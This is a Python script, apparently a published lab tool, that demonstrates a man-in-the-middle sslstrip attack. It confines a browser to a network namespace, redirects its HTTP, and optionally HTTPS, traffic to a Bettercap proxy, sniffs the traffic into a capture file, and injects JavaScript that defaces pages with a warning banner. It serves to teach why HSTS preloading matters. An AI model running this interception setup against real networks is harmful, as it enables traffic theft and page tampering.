#!/usr/bin/env python3
"""
NotSoStrict.py

Version 2

More info at https://github.com/0ber1n/NotSoStrict

MITM + sslstrip demonstration lab using:
  - network namespace as victim
  - veth pair for isolation
  - iptables NAT + REDIRECT to local proxy (Bettercap)
  - Bettercap injects a persistent "Pwned by the strip" banner
  - Chromium launches with a fresh profile into about:blank
    (user manually types the vulnerable HTTP URL)
  - Works for live demos of why HSTS / preload matter

Modes:
  strip-only       → only port 80 redirected (classic sslstrip)
  strip-and-break  → port 80 + 443 redirected (shows HSTS preload protection)

Defacement Modes:
  banner (default) → displays red banner on the top of the page
  fullscreen → displays a full screen page overlay warning

Dependencies:
    bettercap v2.41.0 or higher

**Use this tool only on systems you own or have written permission to test.
Unauthorized use is illegal. The author assumes no liability for misuse.**
"""

import os
import subprocess
import time
import argparse
import sys

# =========================
# Configuration
# =========================

# Namespace + veth setup
NAMESPACE   = "victim"
VETH_HOST   = "v_eth0"
VETH_NS     = "a_eth0"
HOST_IP     = "10.200.100.1"
NS_IP       = "10.200.100.2"
SUBNET      = "10.200.100.0/24"

# Browser
CHROMIUM_PATH = "/usr/bin/chromium"  # adjust if needed
DEFAULT_BROWSE_URL = "http://neverssl.com"  # only used for messaging; browser opens blank

# Bettercap
BETTERCAP_IFACE       = VETH_HOST
BETTERCAP_DEFAULT_LOG = "sslstrip_post.pcap"
BETTERCAP_PROXY_PORT  = 8080

# JS injection file
INJECT_JS_PATH = "/tmp/notso_banner.js"

# chromium profile dir
CHROMIUM_PROFILE_DIR = None


# =========================
# Helpers
# =========================

def run(cmd, check=True):
    print(f"[+] {cmd}")
    subprocess.run(cmd, shell=True, check=check)


def wait_for_interface(iface, poll_interval=1.0):
    path = f"/sys/class/net/{iface}"
    print(f"[*] Waiting for interface {iface}...")
    while not os.path.isdir(path):
        time.sleep(poll_interval)
    print(f"[*] Interface {iface} detected.")


# =========================
# Namespace + NAT
# =========================

def setup_namespace():
    print("[*] Setting up network namespace...")

    run(f"ip netns add {NAMESPACE}")

    # per-namespace DNS
    run(f"mkdir -p /etc/netns/{NAMESPACE}")
    run(f"bash -lc \"echo 'nameserver 1.1.1.1' > /etc/netns/{NAMESPACE}/resolv.conf\"")

    # veth pair
    run(f"ip link add {VETH_HOST} type veth peer name {VETH_NS}")
    run(f"ip link set {VETH_NS} netns {NAMESPACE}")

    run(f"ip addr add {HOST_IP}/24 dev {VETH_HOST}")
    run(f"ip link set {VETH_HOST} up")

    run(f"ip netns exec {NAMESPACE} ip addr add {NS_IP}/24 dev {VETH_NS}")
    run(f"ip netns exec {NAMESPACE} ip link set {VETH_NS} up")
    run(f"ip netns exec {NAMESPACE} ip route add default via {HOST_IP}")


def enable_nat(mode):
    print(f"[*] Enabling NAT + REDIRECT (mode = {mode})")

    run("sysctl -w net.ipv4.ip_forward=1")
    run(f"iptables -t nat -A POSTROUTING -s {SUBNET} -j MASQUERADE")

    # always redirect port 80 → proxy
    run(
        f"iptables -t nat -A PREROUTING -i {VETH_HOST} "
        f"-p tcp --dport 80 -j REDIRECT --to-port {BETTERCAP_PROXY_PORT}"
    )

    if mode == "strip-and-break":
        # redirect 443 → proxy too (causes TLS mismatch)
        run(
            f"iptables -t nat -A PREROUTING -i {VETH_HOST} "
            f"-p tcp --dport 443 -j REDIRECT --to-port {BETTERCAP_PROXY_PORT}"
        )


# =========================
# Bettercap JS Injection
# =========================

def write_inject_js(defacement_mode):
    print(f"[*] Writing JS injector ({defacement_mode}) to {INJECT_JS_PATH}")

    if defacement_mode == "fullscreen":
        js_code = r"""(function(){
            function inject(){
                try {
                    if (document.getElementById('mitm-fullscreen-overlay')) return;

                    var overlay = document.createElement('div');
                    overlay.id = 'mitm-fullscreen-overlay';
                    overlay.setAttribute('style',
                        'position:fixed;top:0;left:0;width:100vw;height:100vh;' +
                        'background:#1a0000;color:#ff4444;font-family:sans-serif;' +
                        'display:flex;flex-direction:column;align-items:center;justify-content:center;' +
                        'z-index:2147483647;text-align:center;' +
                        'padding:20px;font-size:30px;line-height:1.4;' +
                        'animation:fadeIn 0.7s ease-out;'
                    );

                    overlay.innerHTML =
                        '<div style="font-size:70px;font-weight:bold;margin-bottom:20px;">⚠️</div>' +
                        '<div style="font-size:45px;font-weight:bold;margin-bottom:20px;">Intercepted Page</div>' +
                        '<div>This page was modified <b>in transit</b> before reaching your browser.<br>' +
                        'Your connection was <b>not protected by HTTPS because your web admin forgot to register at hstspreload.org</b>.</div>';

                    var style = document.createElement('style');
                    style.innerHTML =
                        '@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }';

                    document.documentElement.appendChild(style);
                    document.documentElement.appendChild(overlay);
                } catch (e) {}
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', inject);
            } else {
                inject();
            }

            try {
                new MutationObserver(inject)
                    .observe(document.documentElement, {childList: true, subtree:true});
            } catch (e) {}
        })();"""
    else:
        js_code = r"""(function(){
            function insertBanner(){
                try {
                    if (document.getElementById('pwned-strip-banner')) return;

                    var b = document.createElement('div');
                    b.id = 'pwned-strip-banner';
                    b.textContent = 'Pwned by the strip';

                    b.setAttribute('style',
                        'position:fixed;top:0;left:0;right:0;z-index:2147483647;' +
                        'background:#b00020;color:#fff;font-family:sans-serif;' +
                        'font-size:20px;text-align:center;padding:12px 0;' +
                        'box-shadow:0 2px 4px rgba(0,0,0,0.3);'
                    );

                    (document.body || document.documentElement).appendChild(b);
                } catch (e) {}
            }

            function ensureBanner(){
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', insertBanner);
                } else {
                    insertBanner();
                }

                try {
                    new MutationObserver(() => insertBanner())
                        .observe(document.documentElement, {childList:true, subtree:true});
                } catch(e){}
            }

            ensureBanner();
        })();"""

    with open(INJECT_JS_PATH, "w") as f:
        f.write(js_code)


def build_bettercap_eval(logfile, defacement_mode):
    write_inject_js(defacement_mode)

    cmds = [
        f"set http.proxy.port {BETTERCAP_PROXY_PORT}",
        "set http.proxy.sslstrip true",
        f"set net.sniff.output {logfile}",
        f"set http.proxy.injectjs {INJECT_JS_PATH}",
        "http.proxy on",
        "net.sniff on",
    ]

    return "; ".join(cmds) + ";"


def start_bettercap_in_new_terminal(iface, logfile, defacement_mode):
    eval_str = build_bettercap_eval(logfile, defacement_mode)
    eval_escaped = eval_str.replace('"', '\\"')

    bettercap_cmd = (
        "sudo bettercap "
        f"-iface {iface} "
        f"-eval \"{eval_escaped}\""
    )

    print("[*] Launching Bettercap in a new terminal...")
    subprocess.Popen([
        "x-terminal-emulator",
        "-e", "bash", "-c",
        f"{bettercap_cmd}; echo; echo '[Bettercap exited]' ; read"
    ])



# =========================
# Browser Launch
# =========================

def launch_chromium():
    print(f"[*] Launching Chromium → about:blank")

    global CHROMIUM_PROFILE_DIR
    CHROMIUM_PROFILE_DIR = f"/tmp/chromium-victim-profile-{os.getpid()}"
    print(f"[*] Fresh profile: {CHROMIUM_PROFILE_DIR}")

    user    = os.getenv("SUDO_USER") or os.getenv("USER") or "root"
    display = os.environ.get("DISPLAY", ":0")
    xauth   = os.environ.get("XAUTHORITY", "")

    os.system(f"xhost +SI:localuser:{user}")

    cmd = (
        f"env -u DBUS_SESSION_BUS_ADDRESS "
        f"ip netns exec {NAMESPACE} runuser -u {user} -- "
        f"env DISPLAY={display} XAUTHORITY={xauth} "
        f"{CHROMIUM_PATH} --no-sandbox "
        f"--user-data-dir={CHROMIUM_PROFILE_DIR} "
        "about:blank"
    )

    print(f"[+] Running: {cmd}")
    os.system(cmd)


# =========================
# Diagnostics
# =========================

def diagnostics():
    print("\n=== Diagnostics ===")
    run("iptables -t nat -L PREROUTING -n -v", check=False)
    run(f"ip netns exec {NAMESPACE} ping -c1 -W1 {HOST_IP}", check=False)
    run(f"ip netns exec {NAMESPACE} curl -I --max-time 5 http://neverssl.com", check=False)
    print("=== End Diagnostics ===\n")


# =========================
# Cleanup
# =========================

def cleanup():
    print("[*] Cleaning up...")

    run(f"ip netns delete {NAMESPACE}", check=False)
    run("iptables -t nat -F", check=False)

    if CHROMIUM_PROFILE_DIR and os.path.isdir(CHROMIUM_PROFILE_DIR):
        run(f"rm -rf {CHROMIUM_PROFILE_DIR}", check=False)

    if os.path.isfile(INJECT_JS_PATH):
        run(f"rm -f {INJECT_JS_PATH}", check=False)


# =========================
# Main flow
# =========================

def full_lab_flow(mode, logfile, defacement):
    try:
        setup_namespace()
        enable_nat(mode)
        wait_for_interface(VETH_HOST)

        start_bettercap_in_new_terminal(
            BETTERCAP_IFACE,
            logfile,
            defacement
        )

        launch_chromium()
        diagnostics()

        print("\n=== Demo Instructions ===")
        print("1. In Chromium, type the vulnerable URL manually:")
        print("      http://yourdomain.com")
        print("2. Watch sslstrip rewrite the HTTP → banner appears.")
        print("3. Try an HSTS-preloaded domain → notice failure.\n")

        input("[*] Press Enter to clean up and exit...")
    finally:
        cleanup()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--mode",
        choices=["strip-only", "strip-and-break"],
        default="strip-only"
    )
    parser.add_argument(
        "--logfile",
        default=BETTERCAP_DEFAULT_LOG
    )
    parser.add_argument(
        "--defacement",
        choices=["banner", "fullscreen"],
        default="banner",
        help="Choose the defacement type: banner or fullscreen overlay"
    )
    args = parser.parse_args()

    full_lab_flow(args.mode, args.logfile, args.defacement)


if __name__ == "__main__":
    main()
